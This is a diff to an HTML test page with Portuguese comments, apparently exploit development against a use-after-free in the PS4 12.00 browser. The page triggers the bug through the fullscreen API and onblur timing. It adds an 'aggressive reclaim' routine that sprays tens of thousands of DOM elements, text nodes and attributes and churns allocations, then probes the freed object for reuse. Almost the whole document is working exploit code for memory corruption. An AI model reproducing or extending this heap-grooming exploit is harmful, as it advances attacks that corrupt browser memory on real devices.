@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Reclaim Test</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim</title>
 </head>
-<body style="background:#222;color:#0f0;font-family:monospace;">
+<body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - Fullscreen UAF → Reclaim</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim</h2>
 <button onclick="runTest()">Run Test</button>
 
 <div id="log" style="margin-top:20px;"></div>
@@ -60,29 +59,61 @@ function setupFullscreen() {
 }
 
 // ==========================
-// RECLAIM (NOVO)
+// 💣 AGGRESSIVE RECLAIM
 // ==========================
-function reclaimDOM() {
-    log("[*] Iniciando DOM reclaim...");
+function aggressiveReclaim() {
+    log("[*] Aggressive reclaim iniciado");
 
-    let reclaim = [];
+    let bucket = [];
 
-    for (let i = 0; i < 20000; i++) {
+    // 🔥 Fase 1 — churn pesado (fragmentação)
+    for (let i = 0; i < 8000; i++) {
         let el = document.createElement("div");
-
-        // padrões controláveis
-        el.innerHTML = "REUSE_" + i;
-        el.setAttribute("data-x", i);
-
-        reclaim.push(el);
+        document.body.appendChild(el);
+        el.remove();
     }
 
-    log("[*] Reclaim concluído: " + reclaim.length + " objetos");
-    return reclaim;
+    // 🔥 Fase 2 — Element spray (mesma estrutura)
+    for (let i = 0; i < 10000; i++) {
+        let el = document.createElement("div");
+
+        el.innerHTML = "REUSE_EL_" + i;
+        el.style.position = "absolute";
+        el.style.width = "100%";
+        el.style.height = "100%";
+
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
+    // 🔥 Fase 3 — TextNode spray (outra arena)
+    for (let i = 0; i < 10000; i++) {
+        let txt = document.createTextNode("TXT_" + i);
+        document.body.appendChild(txt);
+        bucket.push(txt);
+    }
+
+    // 🔥 Fase 4 — Attribute spray
+    for (let i = 0; i < 10000; i++) {
+        let el = document.createElement("div");
+        el.setAttribute("data-x", "ATTR_" + i);
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
+    // 🔥 Fase 5 — churn novamente (força reuse)
+    for (let i = 0; i < 5000; i++) {
+        let el = document.createElement("span");
+        document.body.appendChild(el);
+        el.remove();
+    }
+
+    log("[*] Aggressive reclaim finalizado: " + bucket.length);
+    return bucket;
 }
 
 // ==========================
-// DETECÇÃO (NOVO)
+// DETECÇÃO
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
@@ -91,14 +122,21 @@ function checkUAF(fsTarget) {
         let val = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + val);
     } catch(e) {
-        log("[UAF DETECTADO] innerHTML falhou: " + e);
+        log("[UAF] innerHTML erro: " + e);
     }
 
     try {
         let attr = fsTarget.getAttribute("data-x");
         log("[CHECK] data-x = " + attr);
     } catch(e) {
-        log("[UAF DETECTADO] attribute falhou: " + e);
+        log("[UAF] attribute erro: " + e);
+    }
+
+    try {
+        let node = fsTarget.firstChild;
+        log("[CHECK] firstChild = " + node);
+    } catch(e) {
+        log("[UAF] firstChild erro: " + e);
     }
 }
 
@@ -119,16 +157,16 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 RECLAIM IMEDIATO APÓS LIBERAÇÃO
-    let reclaim = reclaimDOM();
+    // 🔥 janela crítica — múltiplos reclaims
+    setTimeout(() => aggressiveReclaim(), 0);
+    setTimeout(() => aggressiveReclaim(), 50);
+    setTimeout(() => aggressiveReclaim(), 100);
 
-    // 🔬 CHECAR POSSÍVEL REUTILIZAÇÃO
-    setTimeout(() => {
-        checkUAF(fsTarget);
-    }, 100);
+    // 🔬 checagem atrasada
+    setTimeout(() => checkUAF(fsTarget), 300);
 
-    // 🔁 comportamento original mantido
-    setTimeout(() => location.reload(), 1500);
+    // 🔁 comportamento original PRESERVADO
+    setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
@@ -146,8 +184,8 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // 🔒 NÃO ALTERAR TIMING ORIGINAL
-        setTimeout(() => trigger(fsTarget),500);
+        // ⚠️ timing original intacto
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
 </script>
